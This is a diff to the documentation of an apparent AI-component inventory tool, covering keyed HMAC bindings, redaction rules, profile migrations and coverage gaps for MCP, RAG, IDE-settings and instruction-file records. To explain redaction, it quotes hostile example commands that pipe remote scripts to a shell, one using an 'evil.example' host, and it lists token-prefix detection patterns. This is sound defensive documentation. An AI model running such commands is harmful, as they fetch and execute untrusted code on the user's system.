@@ -72,6 +72,22 @@ Yarn, bun and uv settings above, a scoped registry with a well-formed scope, or 
 because a token pasted on its own `.npmrc` line is read as a setting name. Values
 enter only the keyed binding.
 
+For implicit project-root `deno.json` and `deno.jsonc`, the keyed binding retains
+each import specifier paired with its target and each scope paired with its
+import mappings. Swapping two targets, renaming a specifier or moving a mapping
+between scopes changes the binding, even when the multiset of targets is unchanged.
+Specifier names stay inside the HMAC; exported source labels do not disclose them.
+Object-key ordering and JSONC formatting do not change the binding.
+
+Explicit Deno configuration selection (`--config`, `-c`, or `--no-config`) and
+`--import-map` are unsupported coverage gaps, including selectors that name the
+usual root configuration file. A referenced `importMap` in a default configuration
+and unsupported import/scopes shapes are gaps too. The collector does not claim to
+bind selected-file precedence or uncollected resolver dependencies. A binding key
+does not resolve those gaps: collection and project reconciliation fail closed.
+An inventory with such a gap is not an acceptable baseline, even if a bare diff
+between two already-incomplete inventories reports no change.
+
 Values are bound only when the operator sets `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` to
 a secret of at least 32 characters during collection and validation. Generate it
 from a secure random source, for example with
@@ -80,7 +96,7 @@ every keyed record exports a key identifier derived from the key, so a guessable
 lets anyone holding the BOM test guesses for it offline. Records then also carry
 `static_value_binding`, an HMAC-SHA256 under that key over the original server object
 and the raw values of every project resolver setting that applies to it, auth
-settings excepted (profile `nexus-symbiote/mcp-static-values/v2`), and a key
+settings excepted (profile `nexus-symbiote/mcp-static-values/v3`), and a key
 identifier. This detects a different package with the same version, changed
 arguments, environment and header values, endpoint and index paths, opaque launchers
 and the directory of a command. The key never enters the BOM; without it, the binding
@@ -98,12 +114,21 @@ low `completeness` risk that names the key and lists what is unbound: a command 
 recorded launcher package and `-y`, environment values, header values, an endpoint path,
 query, fragment or user information, or project resolver settings. A server whose
 arguments are only its recorded launcher package, or with a bare endpoint origin,
-carries none.
+carries none. `diff --fail-on-alert` treats an MCP server with that finding as a
+medium alert that launch values are unbound, including when the two inventories
+were collected from the same bytes: the redacted export cannot show that an
+argument or environment value stayed the same. Set the key on both collections to
+compare the values. The alert does not record the value.
 
-Profile v1 records (an unkeyed digest over raw configuration, including secret
+MCP keyed-value profile v3 replaces v2, which did not retain Deno import-name-to-target
+associations. Old v2 keyed records fail reconciliation and require recollection and
+review; do not copy or relabel their old binding. This keyed-value version is separate
+from the unchanged v3 exported-structure profile.
+
+Static configuration profile v1 records (an unkeyed digest over raw configuration, including secret
 values) let anyone holding the BOM confirm guesses for low-entropy secrets. They
 fail reconciliation as unknown and require recollection; treat existing v1 exports
-as sensitive and replace them. Profile v2 records (0.1.0) were digested before
+as sensitive and replace them. Static configuration profile v2 records (0.1.0) were digested before
 launchers, package sources and launch context were classified; `validate --project`
 reports them as unknown and asks for recollection, like v1. Neither binding
 authenticates a publisher, identifies the installed executable or establishes that a
@@ -165,8 +190,9 @@ Several security declarations are recorded in clear:
   are kept in full. A scope in `scheme://` URL form with user information, a query or a
   fragment is reduced to its origin, a recognised credential assignment such as
   `token=...` or `api_key=...` is reduced by the standard redaction, and one in a
-  known token format (a JWT or a `ghp_`, `AKIA`, `sk-`, `xox`, `glpat-` or `AIza`
-  prefix) is exported as `***`; a scheme-less scope that contains `?`, `#` or
+  known token format (a JWT or a prefix the [security model](security-model.md#known-false-positive-and-false-negative-classes)
+  lists, such as `ghp_`, `AKIA`, `sk-`, `xox`, `glpat-`, `AIza` or `gsk_`) is
+  exported as `***`; a scheme-less scope that contains `?`, `#` or
   `@`, such as `a?b=1`, is exported in full. A change to the set of scopes raises a high
   `capabilities changed` alert. A scope moved between the card and a skill, or
   between skills, changes only the structure digest below and raises a high
@@ -251,16 +277,20 @@ baseline validated without its key, or with a different key, fails reconciliatio
 The binding needs RFC 8785 JSON values: under the key, a client entry with a value
 such as an unquoted YAML date is a scan failure that names the key.
 
-Without the key, a changed path, query, tenant or other unexported value is
-detected only when it changes an exported origin, a URL's shape, a top-level field
-name or the record's completeness risk; a same-depth path change on the same host,
-or a changed tenant value, passes `diff --fail-on-alert`. A card carries a low `completeness`
+Without the key, a changed path, query, tenant or other unexported value changes
+the record only when it changes an exported origin, a URL's shape, a top-level field
+name or the record's completeness risk. A card carries a low `completeness`
 risk naming the key and listing what is unbound when its endpoint, a supported or
 additional interface URL, or a security scheme URL goes beyond its exported origin
 or has none, when a supported interface sets a `tenant`, or when a scope of the card
 or of a skill was redacted. A client carries it when its `agentCardUrl` goes beyond
-its exported origin and is not one of the root paths above. Other values are bound
-only by the key, and the risk does not list them: descriptions; the id of a skill
+its exported origin and is not one of the root paths above. Both say the values are
+not bound in this inventory, so `diff` raises a medium alert that the record's values
+are unbound on every comparison, changed or not, and names no value: a same-depth
+path change on the same host, or a changed tenant value, fails a keyless
+`diff --fail-on-alert` on that alert rather than on the change. Other values are bound
+only by the key, and the risk does not list them; on a record without the risk, a
+change to one of them passes a keyless `diff --fail-on-alert`: descriptions; the id of a skill
 that has a name, and skill descriptions, tags, examples and input or output modes;
 security scheme fields other than their types and URLs, such as an API key's `name`
 and location, an HTTP scheme's `scheme` and `bearerFormat`, an authorization code
@@ -285,31 +315,54 @@ changes the structure digest too, so the alert is high and names
 ## RAG sources
 
 Each RAG source record carries `static_config_hash` (profile
-`nexus-symbiote/rag-source-structure/v1`), an RFC 8785 digest of the source's field
+`nexus-symbiote/rag-source-structure/v2`), an RFC 8785 digest of the source's field
 names, its exported name, type, store type, embedding model, chunking and index
-identities, the exported form and URL shape of each `source_uris` entry, the digest
-of its inline `documents`, the state of its `sanitization` and `content_filter`
+identities, the exported form and URL shape of each `source_uris` entry, the presence
+and count of its inline `documents`, the state of its `sanitization` and `content_filter`
 controls (`enabled` only for `true` or an object whose `enabled` is `true`;
 `disabled`, `absent` or `unrecognized` otherwise), and a description of every other
 value: of other fields such as `vector_store`, of the members of `embeddings` other
 than `model`, of a control other than a boolean or a boolean `enabled` member, and,
 beside a `sources` or `knowledge_bases` list, of the fields that every source of the
 file shares. The description keeps names, booleans and nulls, and each URL as its
-exported origin and shape; other text and numbers enter it only as their type. Those
-URL origins are exported as `endpoint_origins` and `configuration_endpoint_origins`
-and checked for encrypted transport like `source_uris`; a finding about the shared
+exported origin and shape; other text and numbers enter it only as their type.
+Values under a `documents` field in these other fields are treated as inline content:
+only their presence, count or type is recorded, and URLs inside them are not treated
+as endpoints. URL origins elsewhere are exported as `endpoint_origins` and
+`configuration_endpoint_origins` and checked for encrypted transport like
+`source_uris`; a finding about the shared
 fields is recorded once, on the file's first source. A file that declares more than
 1,000 such URLs and `source_uris` entries together is a collection failure, since
 each may become a finding. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`
 set, `static_value_binding` is an HMAC-SHA256 (profile
 `nexus-symbiote/rag-source-values/v1`) over the source object and an HMAC of the
 shared fields. Without the key, a source whose URIs go beyond their exported origins,
-or whose values the record exports only as redaction markers or not at all, carries a
+or whose nonempty inline document contents or other values the record exports only as
+redaction markers or not at all, carries a
 low `completeness` risk naming the key, and so does the first source for shared
 values. URLs are exported as origins; connection strings, `user:secret@host` forms
 and token-shaped values as redaction markers; inline documents only as
-`document_count` and `properties.inline_documents_hash`. A file whose source list is
+`document_count`. With the same binding key, a content change raises a drift alert;
+without it, a same-count content change cannot be detected. A file whose source list is
 empty but which declares other fields is read as one source.
+
+The previous v1 structure profile and `inline_documents_hash` used unkeyed digests
+of inline content, so holders of those inventories can confirm guesses of low-entropy
+documents. Treat earlier inventories and exports as sensitive. Under v2, every RAG
+source's `static_config_hash` changes once, not only sources with inline documents:
+the profile name is part of the digested structure, and an absent `documents` key is
+digested as `{"present": false}` where v1 digested `null`. On an unchanged project,
+`diff` between a v1 baseline and a v2 collection therefore raises a high
+`properties.static_config_hash changed` alert for every RAG source, and
+`validate --project` on a v1 inventory that records a RAG source fails
+reconciliation, reporting the source as a missing or mismatched local component,
+until it is recollected. Recollect both the reviewed baseline and candidate with
+v2, using the same binding key when content drift must be detected, and review the
+migration before adopting the new baseline. `tests/fixtures/rag-source-structure-v1.json`
+is a v1 capture of one source, and `tests/fixtures/rag-source-structure-v2.json` the
+v2 known-answer vector for the same source: its digested structure and the
+`static_config_hash` it must produce. Recollection does not revoke copies of
+earlier inventories.
 
 ## IDE agent settings
 
@@ -331,13 +384,18 @@ its TOML. A recognized file that cannot be read or parsed is a failure. So is a 
 whose digest or keyed binding has no RFC 8785 form, such as TOML with a date: the
 failure names it, and the record then carries no keyed binding.
 
-The digests of `.codex/config.toml`, `.cursor/cli.json` and the Antigravity, xAI and
-Copilot files always cover the file after the standard
+Every digest in `settings_hashes` covers the file after the standard
 [redaction](security-model.md#known-false-positive-and-false-negative-classes), with
-`env` names but not their values: a URL keeps only its scheme, host and port, and a
-credential in an assignment, after an authorization scheme or in a known token format
-is removed. The redaction is applied separately to the text between the shell
-operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
+or without the key, and the record names that form in `settings_hashes_profile`,
+`nexus-symbiote/ide-settings-redacted/v1`. It keeps `env` names but not their values,
+and the keys of the Claude Code credential helpers `apiKeyHelper`, `awsAuthRefresh`,
+`awsCredentialExport`, `gcpAuthRefresh` and `otelHeadersHelper`, wherever a settings file names one, but
+not their commands: each becomes `***` whatever it is, since a helper command such as
+`printf passphrase` can hold a credential the redaction does not recognise. No helper
+is run. A URL keeps only its scheme, host and
+port, and a credential in an assignment, after an authorization scheme or in a known
+token format is removed. The redaction is applied separately to the text between
+the shell operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
 which are kept, so a URL or an assigned value ends at the first of them: a command,
 an operator or a host written after one without white space, such as
 `https://cdn.example/a.sh;curl${IFS}https://evil.example|sh` or `pwd=$(id)`, stays
@@ -356,28 +414,33 @@ WHATWG parsers such as Codex's as `attacker.example`, or an `http`, `https`, `ws
 `wss` or `ftp` URL with an empty authority) is a failure that names the file, gets no
 digest and fails the scan gate, as the `mcp` collector refuses such an endpoint; with
 the key, the keyed binding covers its host. Keys
-are redacted the same way, so of two entries whose keys differ only in
-what the redaction removes, the digest covers the last one in the file. Anyone holding
+are redacted the same way. When distinct keys redact identically, the digest
+retains all projected values in canonical order rather than dropping earlier entries.
+Anyone holding
 the BOM therefore cannot confirm a guess of a value the
 redaction removes, such as the environment value of an MCP server that
-`.codex/config.toml` declares, which the `mcp` record withholds too. The cost is that
-without the key a change to such a value alone, such as a new token or URL path on
-the same host in a `notify` command such as
+`.codex/config.toml` declares, which the `mcp` record withholds too, or a
+credential helper command. The cost is that
+without the key a change to such a value alone, such as a new helper command, or a
+new token or URL path on the same host in a `notify` command such as
 `TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged; the record
-then carries a low `completeness` finding that names the key. Without
-`NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` the digests of the other files cover the file as
-read, so any changed value changes the record, and anyone holding the BOM can confirm
-a guess of a whole settings file, including the environment values of the MCP servers
-that `.gemini/settings.json` declares. Reordered keys and whitespace change no digest.
-With the key, every digest covers the file after the redaction, and
-`static_value_binding` is an HMAC-SHA256 under the key over every file as read
+then carries a low `completeness` finding that names the key. Reordered keys and
+whitespace change no digest. With the key, `static_value_binding` is an HMAC-SHA256
+under the key over every file as read
 (profile `nexus-symbiote/ide-settings-values/v1`), so the record still changes with
 any value while no unkeyed digest covers environment values or text the redaction
 removes. A value the redaction leaves in place, such as a password pasted into a hook
 command or stored under a key name, can still be confirmed from the digest, so keep
-credentials out of settings files. Collect the baseline and every later snapshot with
-the same key, or without one: the binding appears only with the key, and the digests
-of the files read as is differ between the two modes.
+credentials out of settings files. The digests agree between a keyed and an unkeyed
+collection, except that without the key a file holding an ambiguous URL authority is
+a failure instead of a digest, so enabling the key later changes no recorded digest;
+the binding itself appears only with the key. A record from an earlier build has no
+`settings_hashes_profile`, so `diff` reports the profile as added, a medium alert
+that fails `--fail-on-alert`, and project validation does not reconcile the record.
+Its digest of a file the redaction leaves as it is matches this build's, but earlier
+builds digested most files as read without the key and kept every credential helper
+command with it, so the digest of a file with an `env` map, a helper or another
+redacted value can also differ, a high alert. Record the baseline again.
 
 The `claude-code` record also counts what the files declare: hook handlers per event
 (`declared_hooks`), allow, ask and deny rules (`declared_permission_rule_counts`),
@@ -385,12 +448,52 @@ and, in `settings_declarations`, additional directories, plugins, marketplaces,
 environment variables and MCP server approvals. The `cursor` record counts the
 commands of `.cursor/hooks.json` in `properties.hook_commands`.
 
+## Imported instruction files
+
+A memory file's `@path` import keeps the unkeyed `content_hash` that every instruction
+file carries only when the path imported, and the file a symlink there leads to, if
+any, both have a Markdown suffix (`.md`, `.mdc` or `.markdown`). Any other import is
+inventoried without `content_hash`, and `properties.content_hash_withheld` says why:
+its exact bytes may hold configuration or secrets, which an unkeyed digest would let
+anyone holding the BOM confirm by guessing. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`
+set, `static_value_binding` is an HMAC-SHA256 under the key over the path imported and
+the file's text (profile `nexus-symbiote/prompt-import-content/v1`); without the key
+the record carries a low `completeness` finding that names it. An import is a gap and
+is not read when the path imported, or the file a symlink there leads to, is
+[named as holding credentials](#files-named-as-holding-credentials).
+
+`validate --project` with the key recomputes the binding from the file and counts it
+as a verified hash, and a changed file as a failed one. A binding under another
+profile or key cannot be checked and is unknown evidence. Without the key, or for an
+inventory collected without one, nothing binds the content: the integrity check counts
+the record in `hashes_unbound` and lists it as an `info` issue, the completeness check
+does not report a missing hash, and a change to the file passes validation. Project
+reconciliation compares each record with a fresh collection, so validate with the key
+the inventory was collected with, or without one if it was collected without one.
+
+## Files named as holding credentials
+
+The `prompt` collector does not read a file without a Markdown suffix whose name, or a
+directory on whose path, says it holds credentials, as the
+[known limitations](known-limitations.md#instructions-and-ide-settings) list them, such
+as `.env`, `config/secrets.json` or `secrets/token.txt`, so no `content_hash`, skill
+digest or keyed binding covers it. Such a file is a coverage gap when a memory file
+imports it; when an instruction file such as `CLAUDE.md`, a rule, prompt or subagent
+file, an import or a file of a skill or command directory is a symlink to it, whatever
+that file is named; and when a rule, prompt, subagent, skill or command directory holds
+it, while the directory's other files are inventoried as usual. A symlink replaced
+between that check and the read, so that the read follows it to such a file, is a
+collection failure, and nothing read is kept. A symlink to any other in-root file, such
+as `CLAUDE.md` to `AGENTS.md`, is read through its target.
+
 ## Upgrade existing snapshots
 
 Older static MCP snapshots lack the source binding and configured tool locators,
 and older A2A snapshots lack the structure digests or carry the superseded
 `nexus-symbiote/a2a-card-structure/v1` or `v2` profile; older RAG records carry no
-structure digest, and older IDE agent records no keyed settings binding. They cannot establish this
+structure digest or the superseded `nexus-symbiote/rag-source-structure/v1` profile,
+and older IDE agent records no keyed settings binding and no
+`settings_hashes_profile`. They cannot establish this
 stronger reconciliation contract. Missing or unknown binding profiles fail
 validation and require recollection; copying a newly calculated digest into an
 old approved snapshot is not a migration.
